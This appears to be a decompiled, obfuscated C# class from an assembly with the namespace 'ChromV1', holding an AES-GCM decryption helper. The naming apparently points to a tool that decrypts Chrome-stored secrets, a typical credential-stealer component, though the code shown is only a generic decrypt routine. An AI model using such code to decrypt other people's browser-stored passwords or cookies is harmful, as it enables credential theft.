using System;
using System.Text;
using SmartAssembly.StringsEncoding;

namespace ChromV1
{
	// Token: 0x0200006E RID: 110
	public static class AesGcm256
	{
		// Token: 0x06000259 RID: 601 RVA: 0x00023A34 File Offset: 0x00021C34
		public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
		{
			string text = string.Empty;
			string result;
			try
			{
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesFastEngine());
				AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
				gcmBlockCipher.Init(false, parameters);
				byte[] array = new byte[gcmBlockCipher.GetOutputSize(encryptedBytes.Length)];
				int outOff = gcmBlockCipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, array, 0);
				gcmBlockCipher.DoFinal(array, outOff);
				text = Encoding.UTF8.GetString(array).TrimEnd(Strings.Get(107396945).ToCharArray());
				result = text;
			}
			catch
			{
				result = text;
			}
			return result;
		}
	}
}
